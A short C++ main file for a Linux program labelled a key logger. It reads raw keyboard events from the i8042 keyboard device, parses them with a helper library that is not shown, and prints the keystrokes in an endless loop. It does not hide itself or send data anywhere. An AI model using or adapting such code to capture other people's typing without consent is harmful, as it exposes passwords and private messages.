#include <iostream>
#include <array>
#include "lib.hpp"

using namespace std::literals::chrono_literals;

int main()
{
    std::cout << "Starting Key Logger Application" << std::endl;
    constexpr auto KEYBOARD_PATH = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
    auto maybe_file = KeyboardFile::make(KEYBOARD_PATH);
    if (!maybe_file) {
        std::cerr << "Failed to open " << KEYBOARD_PATH << std::endl;
        exit(1);
    }
    auto &file = maybe_file.value();
    const auto parser = Parser();
    while (true) {
        const auto maybe_data = file.read();
        if (!maybe_data) {
            const auto error = errno;
            std::cerr << "Failed to read bytes "  << error << " " << strerror(error) << std::endl;
            continue;
        }
        const auto parsed_data = parser.parse(maybe_data.value());
        std::cout << parsed_data << std::flush;
        std::this_thread::sleep_for(100ms);
    }
}
